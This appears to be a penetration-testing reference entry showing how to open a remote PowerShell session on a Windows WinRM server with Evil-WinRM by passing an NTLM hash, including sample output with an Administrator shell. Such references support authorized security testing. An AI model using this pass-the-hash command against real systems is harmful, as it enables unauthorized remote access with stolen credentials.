---
id: 66a97e96-09c1-4dbb-9144-83910cd3424e
name: evil-winrm.rb Connect to a WinRM Server (NTLM)
type: command
executor: bash
data: evil-winrm.rb -i $_TARGET -u $_USER -H $_NTLM
output: 'root@kali:~/Documents/evil-winrm# ./evil-winrm.rb -i 10.10.10.10 -u Administrator
  -H ''FD030F3D045072C0508748D1C953862B''


  Evil-WinRM shell v2.3


  Info: Establishing connection to remote endpoint


  *Evil-WinRM* PS C:\Users\Administrator\Documents>'
created_at: '2020-03-16T02:05:05.221748+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Evil-WinRM]]'
- '[[ps]]'
---

# evil-winrm.rb Connect to a WinRM Server (NTLM)

```bash
evil-winrm.rb -i $_TARGET -u $_USER -H $_NTLM
```

## Expected Output

```
root@kali:~/Documents/evil-winrm# ./evil-winrm.rb -i 10.10.10.10 -u Administrator -H 'FD030F3D045072C0508748D1C953862B'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


